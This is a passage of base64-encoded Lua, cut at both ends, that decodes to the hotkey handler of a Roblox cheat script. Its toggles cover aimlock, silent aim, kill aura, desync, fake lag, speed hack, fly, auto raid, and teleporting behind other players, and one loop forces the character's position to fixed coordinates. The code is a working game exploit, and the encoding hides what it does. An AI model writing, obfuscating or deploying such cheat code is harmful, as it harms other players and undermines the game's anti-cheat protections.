y5Tbm93R3VpLkVuYWJsZWQgPSBmYWxzZQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIF9HLlNub3dHdWkuRW5hYmxlZCA9IGlzR3VpVmlzaWJsZQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIGlmIGlucHV0LktleUNvZGUgPT0gQ29uZmlnLkdob3N0TW9kZUtleSBhbmQgQ29uZmlnLkdob3N0TW9kZUtleSB+PSBFbnVtLktleUNvZGUuVW5rbm93biB0aGVuCiAgICAgICAgICAgIENvbmZpZy5HaG9zdE1vZGUgPSBub3QgQ29uZmlnLkdob3N0TW9kZQogICAgICAgICAgICBpZiBUb2dnbGVCdXR0b25zWyJHaG9zdE1vZGUiXSB0aGVuCiAgICAgICAgICAgICAgICBUb2dnbGVCdXR0b25zWyJHaG9zdE1vZGUiXS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29uZmlnLkdob3N0TW9kZSBhbmQgQ3VycmVudFRoZW1lQ29sb3Igb3IgQ29sb3IzLmZyb21SR0IoNDAsIDQwLCA1MCkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGlmIENvbmZpZy5HaG9zdE1vZGUgdGhlbiBFbmFibGVHaG9zdE1vZGUoKSBlbHNlIERpc2FibGVHaG9zdE1vZGUoKSBlbmQKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICBpZiBpbnB1dC5LZXlDb2RlID09IENvbmZpZy5GYWtlTGFnS2V5IGFuZCBDb25maWcuRmFrZUxhZ0tleSB+PSBFbnVtLktleUNvZGUuVW5rbm93biB0aGVuCiAgICAgICAgICAgIENvbmZpZy5GYWtlTGFnID0gbm90IENvbmZpZy5GYWtlTGFnCiAgICAgICAgICAgIGlmIFRvZ2dsZUJ1dHRvbnNbIkZha2VMYWciXSB0aGVuCiAgICAgICAgICAgICAgICBUb2dnbGVCdXR0b25zWyJGYWtlTGFnIl0uQmFja2dyb3VuZENvbG9yMyA9IENvbmZpZy5GYWtlTGFnIGFuZCBDdXJyZW50VGhlbWVDb2xvciBvciBDb2xvcjMuZnJvbVJHQig0MCwgNDAsIDUwKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICBpZiBpbnB1dC5LZXlDb2RlID09IENvbmZpZy5EZXN5bmNLZXkgYW5kIENvbmZpZy5EZXN5bmNLZXkgfj0gRW51bS5LZXlDb2RlLlVua25vd24gdGhlbgogICAgICAgICAgICBDb25maWcuRGVzeW5jID0gbm90IENvbmZpZy5EZXN5bmMKICAgICAgICAgICAgaWYgQ29uZmlnLkRlc3luYyB0aGVuCiAgICAgICAgICAgICAgICBlbmFibGVEZXN5bmMoKQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBkaXNhYmxlRGVzeW5jKCkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGlmIFRvZ2dsZUJ1dHRvbnNbIkRlc3luYyJdIHRoZW4KICAgICAgICAgICAgICAgIFRvZ2dsZUJ1dHRvbnNbIkRlc3luYyJdLkJhY2tncm91bmRDb2xvcjMgPSBDb25maWcuRGVzeW5jIGFuZCBDdXJyZW50VGhlbWVDb2xvciBvciBDb2xvcjMuZnJvbVJHQig0MCwgNDAsIDUwKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAtLSBDVVJTT1IgTE9DSyBBQ1RJVkFURS9DSEFOR0UgS0VZCiAgICAgICAgaWYgaW5wdXQuS2V5Q29kZSA9PSBDb25maWcuQ3Vyc29yTG9ja0tleSBhbmQgQ29uZmlnLkN1cnNvckxvY2tLZXkgfj0gRW51bS5LZXlDb2RlLlVua25vd24gdGhlbgogICAgICAgICAgICBDb25maWcuQ3Vyc29yTG9jayA9IHRydWUKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIFRvZ2dsZUJ1dHRvbnNbIkN1cnNvckxvY2siXSB0aGVuCiAgICAgICAgICAgICAgICBUb2dnbGVCdXR0b25zWyJDdXJzb3JMb2NrIl0uQmFja2dyb3VuZENvbG9yMyA9IEN1cnJlbnRUaGVtZUNvbG9yCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgaWYgQ29uZmlnLkN1cnNvckxvY2tVc2VyID09ICIiIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldCA9IGdldENsb3Nlc3RQbGF5ZXJUb01vdXNlKG5pbCwgZmFsc2UpCiAgICAgICAgICAgICAgICBpZiB0YXJnZXQgYW5kIHRhcmdldC5DaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICAgICAgICAgIGN1cnNvckxvY2tUYXJnZXQgPSB0YXJnZXQuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgQ3Vyc29yTGFiZWwuVGV4dCA9ICJMT0NLRUQ6ICIgLi4gdGFyZ2V0Lk5hbWUKICAgICAgICAgICAgICAgICAgICBDdXJzb3JMYWJlbC5UZXh0Q29sb3IzID0gQ3VycmVudFRoZW1lQ29sb3IKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICBDdXJzb3JMYWJlbC5UZXh0ID0gIlN0YXR1czogTm8gVGFyZ2V0IEZvdW5kIgogICAgICAgICAgICAgICAgICAgIEN1cnNvckxhYmVsLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDUwLCA1MCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBDdXJzb3JMYWJlbC5UZXh0ID0gIlNlYXJjaGluZzogIiAuLiBDb25maWcuQ3Vyc29yTG9ja1VzZXIKICAgICAgICAgICAgICAgIEN1cnNvckxhYmVsLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDIwMCwgMCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgLS0gQ1VSU09SIExPQ0sgRElTQUJMRSBLRVkKICAgICAgICBpZiBpbnB1dC5LZXlDb2RlID09IENvbmZpZy5DdXJzb3JMb2NrRGlzYWJsZUtleSBhbmQgQ29uZmlnLkN1cnNvckxvY2tEaXNhYmxlS2V5IH49IEVudW0uS2V5Q29kZS5Vbmtub3duIHRoZW4KICAgICAgICAgICAgQ29uZmlnLkN1cnNvckxvY2sgPSBmYWxzZQogICAgICAgICAgICBjdXJzb3JMb2NrVGFyZ2V0ID0gbmlsCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBUb2dnbGVCdXR0b25zWyJDdXJzb3JMb2NrIl0gdGhlbgogICAgICAgICAgICAgICAgVG9nZ2xlQnV0dG9uc1siQ3Vyc29yTG9jayJdLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQig0MCwgNDAsIDUwKQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIEN1cnNvckxhYmVsLlRleHQgPSAiU3RhdHVzOiBEaXNhYmxlZCIKICAgICAgICAgICAgQ3Vyc29yTGFiZWwuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDE1MCwgMTUwLCAxNTApCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgLS0gQUlNTE9DSyBLRVkgKE1hbnVhbCBUb2dnbGUpCiAgICAgICAgaWYgaW5wdXQuS2V5Q29kZSA9PSBDb25maWcuQWltbG9ja0tleSBhbmQgQ29uZmlnLkFpbWxvY2sgYW5kIENvbmZpZy5BaW1sb2NrS2V5IH49IEVudW0uS2V5Q29kZS5Vbmtub3duIHRoZW4KICAgICAgICAgICAgaWYgYWltbG9ja1RhcmdldCB0aGVuCiAgICAgICAgICAgICAgICBhaW1sb2NrVGFyZ2V0ID0gbmlsCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldFBsciA9IGdldENsb3Nlc3RQbGF5ZXJUb01vdXNlKG5pbCwgZmFsc2UpCiAgICAgICAgICAgICAgICBpZiB0YXJnZXRQbHIgYW5kIHRhcmdldFBsci5DaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICAgICAgICAgIGFpbWxvY2tUYXJnZXQgPSB0YXJnZXRQbHIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgYWltbG9ja0VuZFRpbWUgPSBtYXRoLmh1Z2UgLS0gTWFudWFsIGxvY2sgc3RheXMgZm9yZXZlciB1bnRpbCB0b2dnbGVkIG9mZgogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIC0tIFpPTkUgTE9DSyBLRVkKICAgICAgICBpZiBpbnB1dC5LZXlDb2RlID09IENvbmZpZy5ab25lS2V5IGFuZCBDb25maWcuWm9uZUtleSB+PSBFbnVtLktleUNvZGUuVW5rbm93biB0aGVuCiAgICAgICAgICAgIENvbmZpZy5ab25lTG9jayA9IG5vdCBDb25maWcuWm9uZUxvY2sKICAgICAgICAgICAgaWYgVG9nZ2xlQnV0dG9uc1siWm9uZUxvY2siXSB0aGVuCiAgICAgICAgICAgICAgICBUb2dnbGVCdXR0b25zWyJab25lTG9jayJdLkJhY2tncm91bmRDb2xvcjMgPSBDb25maWcuWm9uZUxvY2sgYW5kIEN1cnJlbnRUaGVtZUNvbG9yIG9yIENvbG9yMy5mcm9tUkdCKDQwLCA0MCwgNTApCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIC0tIFNJTEVOVCBBSU0gVE9HR0xFIEtFWQogICAgICAgIGlmIGlucHV0LktleUNvZGUgPT0gQ29uZmlnLlNpbGVudEFpbUtleSBhbmQgQ29uZmlnLlNpbGVudEFpbUtleSB+PSBFbnVtLktleUNvZGUuVW5rbm93biB0aGVuCiAgICAgICAgICAgIENvbmZpZy5TaWxlbnRBaW0gPSBub3QgQ29uZmlnLlNpbGVudEFpbQogICAgICAgICAgICBpZiBUb2dnbGVCdXR0b25zWyJTaWxlbnRBaW0iXSB0aGVuCiAgICAgICAgICAgICAgICBUb2dnbGVCdXR0b25zWyJTaWxlbnRBaW0iXS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29uZmlnLlNpbGVudEFpbSBhbmQgQ3VycmVudFRoZW1lQ29sb3Igb3IgQ29sb3IzLmZyb21SR0IoNDAsIDQwLCA1MCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgLS0gRkFSTSBLRVkKICAgICAgICBpZiBpbnB1dC5LZXlDb2RlID09IENvbmZpZy5GYXJtS2V5IGFuZCBDb25maWcuRmFybUtleSB+PSBFbnVtLktleUNvZGUuVW5rbm93biB0aGVuCiAgICAgICAgICAgIENvbmZpZy5GYXJtTmVhcmVzdCA9IG5vdCBDb25maWcuRmFybU5lYXJlc3QKICAgICAgICAgICAgaWYgVG9nZ2xlQnV0dG9uc1siRmFybU5lYXJlc3QiXSB0aGVuCiAgICAgICAgICAgICAgICBUb2dnbGVCdXR0b25zWyJGYXJtTmVhcmVzdCJdLkJhY2tncm91bmRDb2xvcjMgPSBDb25maWcuRmFybU5lYXJlc3QgYW5kIEN1cnJlbnRUaGVtZUNvbG9yIG9yIENvbG9yMy5mcm9tUkdCKDQwLCA0MCwgNTApCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgaWYgQ29uZmlnLkZhcm1OZWFyZXN0IHRoZW4KICAgICAgICAgICAgICAgIENvbmZpZy5SZWFjaCA9IHRydWUKICAgICAgICAgICAgICAgIENvbmZpZy5SZWFjaFNpemUgPSAxMDAKICAgICAgICAgICAgICAgIENvbmZpZy5SZWFjaFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICAgICAgICAgIGlmIFRvZ2dsZUJ1dHRvbnNbIlJlYWNoIl0gdGhlbiBUb2dnbGVCdXR0b25zWyJSZWFjaCJdLkJhY2tncm91bmRDb2xvcjMgPSBDdXJyZW50VGhlbWVDb2xvciBlbmQKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgQ29uZmlnLlJlYWNoID0gZmFsc2UKICAgICAgICAgICAgICAgIENvbmZpZy5SZWFjaFNpemUgPSAwCiAgICAgICAgICAgICAgICBpZiBUb2dnbGVCdXR0b25zWyJSZWFjaCJdIHRoZW4gVG9nZ2xlQnV0dG9uc1siUmVhY2giXS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoNDAsIDQwLCA1MCkgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIC0tIEFVVE8gUkFJRCBLRVkKICAgICAgICBpZiBpbnB1dC5LZXlDb2RlID09IENvbmZpZy5BdXRvUmFpZEtleSBhbmQgQ29uZmlnLkF1dG9SYWlkS2V5IH49IEVudW0uS2V5Q29kZS5Vbmtub3duIHRoZW4KICAgICAgICAgICAgQ29uZmlnLkF1dG9SYWlkID0gbm90IENvbmZpZy5BdXRvUmFpZAogICAgICAgICAgICBpZiBUb2dnbGVCdXR0b25zWyJBdXRvUmFpZCJdIHRoZW4KICAgICAgICAgICAgICAgIFRvZ2dsZUJ1dHRvbnNbIkF1dG9SYWlkIl0uQmFja2dyb3VuZENvbG9yMyA9IENvbmZpZy5BdXRvUmFpZCBhbmQgQ3VycmVudFRoZW1lQ29sb3Igb3IgQ29sb3IzLmZyb21SR0IoNDAsIDQwLCA1MCkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGlmIENvbmZpZy5BdXRvUmFpZCB0aGVuCiAgICAgICAgICAgICAgICAgQ29uZmlnLkFudGlMYXZhID0gdHJ1ZQogICAgICAgICAgICAgICAgIGlmIFRvZ2dsZUJ1dHRvbnNbIkFudGlMYXZhIl0gdGhlbiBUb2dnbGVCdXR0b25zWyJBbnRpTGF2YSJdLkJhY2tncm91bmRDb2xvcjMgPSBDdXJyZW50VGhlbWVDb2xvciBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgLS0gT05FIFNIT1QgS0VZCiAgICAgICAgaWYgaW5wdXQuS2V5Q29kZSA9PSBDb25maWcuT25lU2hvdEtleSBhbmQgQ29uZmlnLk9uZVNob3RLZXkgfj0gRW51bS5LZXlDb2RlLlVua25vd24gdGhlbgogICAgICAgICAgICBpZiBpc09uZVNob3RBY3RpdmUgdGhlbgogICAgICAgICAgICAgICAgaXNPbmVTaG90QWN0aXZlID0gZmFsc2UKICAgICAgICAgICAgICAgIGlmIG9uZVNob3RUaHJlYWQgdGhlbiB0YXNrLmNhbmNlbChvbmVTaG90VGhyZWFkKTsgb25lU2hvdFRocmVhZCA9IG5pbCBlbmQKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgc3RvcFRlbGVwb3J0KCkKICAgICAgICAgICAgICAgIGlzT25lU2hvdEFjdGl2ZSA9IHRydWUKICAgICAgICAgICAgICAgIG9uZVNob3RUaHJlYWQgPSB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICB3aGlsZSBpc09uZVNob3RBY3RpdmUgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgY2hhcmFjdGVyIGFuZCByb290UGFydCB0aGVuIHJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoOTM3Ljk1LCAyNTEuNDIsIDMyODg2LjY4KSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgLS0gUEFOSUMgTU9ERSBLRVkKICAgICAgICBpZiBpbnB1dC5LZXlDb2RlID09IENvbmZpZy5QYW5pY01vZGVLZXkgYW5kIENvbmZpZy5QYW5pY01vZGVLZXkgfj0gRW51bS5LZXlDb2RlLlVua25vd24gdGhlbgogICAgICAgICAgICBDb25maWcuUGFuaWNNb2RlID0gbm90IENvbmZpZy5QYW5pY01vZGUKICAgICAgICAgICAgLS0gRGlzYWJsZSBBdXRvIFBhbmljIGlmIG1hbnVhbCB0b2dnbGUgaXMgdXNlZCB0byBwcmV2ZW50IGNvbmZsaWN0CiAgICAgICAgICAgIGlmIENvbmZpZy5QYW5pY01vZGVIZWFsdGhFbmFibGUgdGhlbgogICAgICAgICAgICAgICAgQ29uZmlnLlBhbmljTW9kZUhlYWx0aEVuYWJsZSA9IGZhbHNlCiAgICAgICAgICAgICAgICBpZiBUb2dnbGVCdXR0b25zWyJQYW5pY01vZGVIZWFsdGhFbmFibGUiXSB0aGVuCiAgICAgICAgICAgICAgICAgICAgVG9nZ2xlQnV0dG9uc1siUGFuaWNNb2RlSGVhbHRoRW5hYmxlIl0uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDQwLCA0MCwgNTApCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIFNlbmROb3RpZmljYXRpb24oIkF1dG8gUGFuaWMgZGlzYWJsZWQgZm9yIG1hbnVhbCBjb250cm9sIiwgMikKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGlmIFRvZ2dsZUJ1dHRvbnNbIlBhbmljTW9kZSJdIHRoZW4KICAgICAgICAgICAgICAgIFRvZ2dsZUJ1dHRvbnNbIlBhbmljTW9kZSJdLkJhY2tncm91bmRDb2xvcjMgPSBDb25maWcuUGFuaWNNb2RlIGFuZCBDdXJyZW50VGhlbWVDb2xvciBvciBDb2xvcjMuZnJvbVJHQig0MCwgNDAsIDUwKQogICAg" .. "ICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAtLSBPUkJJVCBQTEFZRVIgS0VZCiAgICAgICAgaWYgaW5wdXQuS2V5Q29kZSA9PSBDb25maWcuT3JiaXRQbGF5ZXJLZXkgYW5kIENvbmZpZy5PcmJpdFBsYXllcktleSB+PSBFbnVtLktleUNvZGUuVW5rbm93biB0aGVuCiAgICAgICAgICAgIENvbmZpZy5PcmJpdFBsYXllciA9IG5vdCBDb25maWcuT3JiaXRQbGF5ZXIKICAgICAgICAgICAgaWYgVG9nZ2xlQnV0dG9uc1siT3JiaXRQbGF5ZXIiXSB0aGVuCiAgICAgICAgICAgICAgICBUb2dnbGVCdXR0b25zWyJPcmJpdFBsYXllciJdLkJhY2tncm91bmRDb2xvcjMgPSBDb25maWcuT3JiaXRQbGF5ZXIgYW5kIEN1cnJlbnRUaGVtZUNvbG9yIG9yIENvbG9yMy5mcm9tUkdCKDQwLCA0MCwgNTApCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIC0tIE9SQklUIFBMQVlFUiBLRVkKICAgICAgICBpZiBpbnB1dC5LZXlDb2RlID09IENvbmZpZy5PcmJpdFBsYXllcktleSBhbmQgQ29uZmlnLk9yYml0UGxheWVyS2V5IH49IEVudW0uS2V5Q29kZS5Vbmtub3duIHRoZW4KICAgICAgICAgICAgQ29uZmlnLk9yYml0UGxheWVyID0gbm90IENvbmZpZy5PcmJpdFBsYXllcgogICAgICAgICAgICBpZiBUb2dnbGVCdXR0b25zWyJPcmJpdFBsYXllciJdIHRoZW4KICAgICAgICAgICAgICAgIFRvZ2dsZUJ1dHRvbnNbIk9yYml0UGxheWVyIl0uQmFja2dyb3VuZENvbG9yMyA9IENvbmZpZy5PcmJpdFBsYXllciBhbmQgQ3VycmVudFRoZW1lQ29sb3Igb3IgQ29sb3IzLmZyb21SR0IoNDAsIDQwLCA1MCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgaWYgQ29uZmlnLkluZkp1bXAgYW5kIGlucHV0LktleUNvZGUgPT0gRW51bS5LZXlDb2RlLlNwYWNlIHRoZW4KICAgICAgICAgICAgaHVtYW5vaWQ6Q2hhbmdlU3RhdGUoRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5KdW1waW5nKQogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIC0tIFNQRUVEIEtFWQogICAgICAgIGlmIGlucHV0LktleUNvZGUgPT0gQ29uZmlnLlNwZWVkS2V5IGFuZCBDb25maWcuU3BlZWRLZXkgfj0gRW51bS5LZXlDb2RlLlVua25vd24gdGhlbgogICAgICAgICAgICBDb25maWcuU3BlZWRIYWNrID0gbm90IENvbmZpZy5TcGVlZEhhY2sKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAtLSBGTFkgS0VZCiAgICAgICAgaWYgaW5wdXQuS2V5Q29kZSA9PSBDb25maWcuU3RhbmRhcmRGbHlLZXkgYW5kIENvbmZpZy5TdGFuZGFyZEZseUtleSB+PSBFbnVtLktleUNvZGUuVW5rbm93biB0aGVuCiAgICAgICAgICAgIENvbmZpZy5TdGFuZGFyZEZseSA9IG5vdCBDb25maWcuU3RhbmRhcmRGbHkKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAtLSBMT0NLIEtFWSAoQVVUTyBBVVJBIFNZTkMpCiAgICAgICAgaWYgaW5wdXQuS2V5Q29kZSA9PSBDb25maWcuTG9ja0tleSBhbmQgQ29uZmlnLkxvY2tLZXkgfj0gRW51bS5LZXlDb2RlLlVua25vd24gdGhlbgogICAgICAgICAgICBDb25maWcuRWFzeUxvY2sgPSBub3QgQ29uZmlnLkVhc3lMb2NrCiAgICAgICAgICAgIGlmIFRvZ2dsZUJ1dHRvbnNbIkVhc3lMb2NrIl0gdGhlbgogICAgICAgICAgICAgICAgVG9nZ2xlQnV0dG9uc1siRWFzeUxvY2siXS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29uZmlnLkVhc3lMb2NrIGFuZCBDdXJyZW50VGhlbWVDb2xvciBvciBDb2xvcjMuZnJvbVJHQig0MCwgNDAsIDUwKQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIENvbmZpZy5FYXN5TG9jayB0aGVuCiAgICAgICAgICAgICAgICAtLSBMT0NLCiAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXQgPSBnZXRDbG9zZXN0UGxheWVyVG9Nb3VzZShuaWwsIGZhbHNlKSAtLSBObyBGT1YgbGltaXQgZm9yIGhhcmQgbG9jawogICAgICAgICAgICAgICAgaWYgdGFyZ2V0IHRoZW4KICAgICAgICAgICAgICAgICAgICBDb25maWcuVGFyZ2V0TmFtZSA9IHRhcmdldC5OYW1lCiAgICAgICAgICAgICAgICAgICAgVGFyZ2V0TGFiZWwuVGV4dCA9ICJMT0NLRUQ6ICIgLi4gdGFyZ2V0Lk5hbWUKICAgICAgICAgICAgICAgICAgICBUYXJnZXRMYWJlbC5UZXh0Q29sb3IzID0gQ3VycmVudFRoZW1lQ29sb3IKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAtLSBBVVRPIEVOQUJMRSBBVVJBCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnLktpbGxBdXJhID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgIGlmIFRvZ2dsZUJ1dHRvbnNbIktpbGxBdXJhIl0gdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBUb2dnbGVCdXR0b25zWyJLaWxsQXVyYSJdLkJhY2tncm91bmRDb2xvcjMgPSBDdXJyZW50VGhlbWVDb2xvcgogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIENvbmZpZy5FYXN5TG9jayA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgaWYgVG9nZ2xlQnV0dG9uc1siRWFzeUxvY2siXSB0aGVuIFRvZ2dsZUJ1dHRvbnNbIkVhc3lMb2NrIl0uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDQwLCA0MCwgNTApIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIC0tIFVOTE9DSwogICAgICAgICAgICAgICAgQ29uZmlnLlRhcmdldE5hbWUgPSAiTm9uZSIKICAgICAgICAgICAgICAgIFRhcmdldExhYmVsLlRleHQgPSAiU3RhdHVzOiBVbmxvY2tlZCIKICAgICAgICAgICAgICAgIFRhcmdldExhYmVsLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigxNTAsIDE1MCwgMTUwKQogICAgICAgICAgICAgICAgbG9jYWwgYnYgPSByb290UGFydDpGaW5kRmlyc3RDaGlsZCgiRmx5VmVsb2NpdHkiKQogICAgICAgICAgICAgICAgaWYgYnYgdGhlbiBidjpEZXN0cm95KCkgZW5kCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC0tIEFVVE8gRElTQUJMRSBBVVJBCiAgICAgICAgICAgICAgICBDb25maWcuS2lsbEF1cmEgPSBmYWxzZQogICAgICAgICAgICAgICAgaWYgVG9nZ2xlQnV0dG9uc1siS2lsbEF1cmEiXSB0aGVuCiAgICAgICAgICAgICAgICAgICAgVG9nZ2xlQnV0dG9uc1siS2lsbEF1cmEiXS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoNDAsIDQwLCA1MCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAtLSBUUCBQTEFZRVIgS0VZCiAgICAgICAgaWYgaW5wdXQuS2V5Q29kZSA9PSBDb25maWcuVFBQbGF5ZXJLZXkgYW5kIENvbmZpZy5UUFBsYXllcktleSB+PSBFbnVtLktleUNvZGUuVW5rbm93biB0aGVuCiAgICAgICAgICAgIGxvY2FsIHRhcmdldENoYXIgPSBuaWwKICAgICAgICAgICAgCiAgICAgICAgICAgIC0tIDEuIFRyeSBNb3VzZSBUYXJnZXQgKERpcmVjdCBBaW0pCiAgICAgICAgICAgIGxvY2FsIG1vdXNlVGFyZ2V0ID0gbW91c2UuVGFyZ2V0CiAgICAgICAgICAgIGlmIG1vdXNlVGFyZ2V0IGFuZCBtb3VzZVRhcmdldC5QYXJlbnQgdGhlbgogICAgICAgICAgICAgICAgIGxvY2FsIHBsciA9IFBsYXllcnM6R2V0UGxheWVyRnJvbUNoYXJhY3Rlcihtb3VzZVRhcmdldC5QYXJlbnQpCiAgICAgICAgICAgICAgICAgaWYgcGxyIGFuZCBwbHIgfj0gcGxheWVyIHRoZW4gdGFyZ2V0Q2hhciA9IG1vdXNlVGFyZ2V0LlBhcmVudCBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICAtLSAyLiBGYWxsYmFjayB0byBjbG9zZXN0IHRvIG1vdXNlCiAgICAgICAgICAgIGlmIG5vdCB0YXJnZXRDaGFyIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIHAgPSBnZXRDbG9zZXN0UGxheWVyVG9Nb3VzZShtYXRoLmh1Z2UsIGZhbHNlKQogICAgICAgICAgICAgICAgaWYgcCB0aGVuIHRhcmdldENoYXIgPSBwLkNoYXJhY3RlciBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiB0YXJnZXRDaGFyIGFuZCB0YXJnZXRDaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgYW5kIHJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIGRpc3QgPSAodGFyZ2V0Q2hhci5IdW1hbm9pZFJvb3RQYXJ0LlBvc2l0aW9uIC0gcm9vdFBhcnQuUG9zaXRpb24pLk1hZ25pdHVkZQogICAgICAgICAgICAgICAgaWYgZGlzdCA8PSBDb25maWcuVFBQbGF5ZXJSYW5nZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgLS0gVGVsZXBvcnQgYmVoaW5kIHBsYXllcgogICAgICAgICAgICAgICAgICAgIHJvb3RQYXJ0LkNGcmFtZSA9IHRhcmdldENoYXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgKiBDRnJhbWUubmV3KDAsIDAsIDMpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQpKQoKICAgIHRhYmxlLmluc2VydChDb25uZWN0aW9ucywgcGxheWVyLkNoYXJhY3RlckFkZGVkOkNvbm5lY3QoZnVuY3Rpb24obmV3Q2hhcikKICAgICAgICBjaGFyYWN0ZXIgPSBuZXdDaGFyCiAgICAgICAgcm9vdFBhcnQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IiwgMTApCiAgICAgICAgaHVtYW5vaWQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZCIsIDEwKQogICAgICAgIGNoYXJhY3Rlci5DaGlsZFJlbW92ZWQ6Q29ubmVjdChmdW5jdGlvbihjaGlsZCkgcmVzdG9yZVRvb2xDb2xvcihjaGlsZCkgZW5kKQogICAgICAgIAogICAgICAgIGlmIENvbmZpZy5JbnN0YW50UmVzcGF3biB0aGVuCiAgICAgICAgICAgIEJpbmRJbnN0YW50UmVzcGF3bigpCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgY29tYmF0VGFyZ2V0ID0gbmlsCiAgICAgICAgY3Vyc29yTG9ja1RhcmdldCA9IG5pbAogICAgICAgIGhha2lBdHRlbXB0ZWQgPSBmYWxzZQogICAgICAgIGlmIHJlYWNoQ29ubmVjdGlvbiB0aGVuCiAgICAgICAgICAgIHJlYWNoQ29ubmVjdG